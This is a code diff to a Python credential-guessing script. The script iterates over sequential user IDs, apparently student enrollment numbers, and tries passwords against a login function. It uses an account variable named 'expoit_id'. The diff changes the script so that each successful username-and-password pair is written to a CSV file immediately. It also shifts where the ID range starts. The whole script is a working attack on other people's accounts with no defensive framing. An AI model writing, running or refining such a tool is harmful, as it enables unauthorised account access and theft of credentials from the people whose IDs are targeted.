@@ -40,9 +40,8 @@ def main():
     csv_file_path = os.path.join(curr_dir, "matched.csv")
 
     wrong_attempts = 0
-    found_credentials_list = [] 
 
-    ids_to_try = [enroll for enroll in range(21102001, 22102184)] # + [enroll for enroll in range(21103001, 21103344)]
+    ids_to_try = [enroll for enroll in range(21102006, 22102184)] # + [enroll for enroll in range(21103001, 21103344)]
 
     try: 
         for user_id_to_try in ids_to_try:
@@ -67,6 +66,19 @@ def main():
                     if login_successful:
                         print(f"SUCCESS: Login successful for User ID: {user_id_str} with Password: {password_attempt}")
                         
+                        # Write found credentials to CSV immediately
+                        try:
+                            found_credential_df = pd.DataFrame([{'username': user_id_str, 'password': password_attempt}])
+                            file_exists = os.path.exists(csv_file_path)
+                            write_header = not file_exists or (file_exists and os.path.getsize(csv_file_path) == 0)
+                            
+                            found_credential_df.to_csv(csv_file_path, mode='a', header=write_header, index=False, encoding='utf-8')
+                            print(f"Credentials User ID: {user_id_str}, Password: {password_attempt} saved to {csv_file_path}")
+                        except IOError as e_csv_immediate:
+                            print(f"ERROR: CSV file error when writing immediately ({csv_file_path}): {e_csv_immediate}")
+                        except Exception as e_pandas_immediate:
+                            print(f"ERROR: An unexpected error occurred during immediate pandas CSV writing: {e_pandas_immediate}")
+
                         try:
                             logout_status_exploit = logout({"username": expoit_id, "password": expoit_pass})
                             if logout_status_exploit is True:
@@ -76,7 +88,6 @@ def main():
                         except Exception as e_logout:
                             print(f"Warning: Error during logout of '{expoit_id}': {e_logout}")
 
-                        found_credentials_list.append({'username': user_id_str, 'password': password_attempt})
                         print(f"Credentials User ID: {user_id_str}, Password: {password_attempt} recorded.")
                         
                         break 
@@ -97,21 +108,7 @@ def main():
     except Exception as e_unexpected: 
         print(f"FATAL: An unexpected error occurred during the process: {e_unexpected}")
     finally: 
-        if found_credentials_list:
-            print(f"\nAttempting to save {len(found_credentials_list)} found credentials to {csv_file_path}...")
-            try:
-                df = pd.DataFrame(found_credentials_list) 
-                file_exists = os.path.exists(csv_file_path)
-                write_header = not file_exists or (file_exists and os.path.getsize(csv_file_path) == 0)
-                
-                df.to_csv(csv_file_path, mode='a', header=write_header, index=False, encoding='utf-8')
-                print(f"Successfully saved/appended credentials to {csv_file_path}")
-            except IOError as e_csv:
-                print(f"FATAL: CSV file error when writing with pandas ({csv_file_path}): {e_csv}")
-            except Exception as e_pandas_write:
-                 print(f"FATAL: An unexpected error occurred during pandas CSV writing: {e_pandas_write}")
-        else:
-            print("No new credentials found to save in this session.")
+        print("Script execution finished.")
 
 if __name__ == "__main__":
     main()
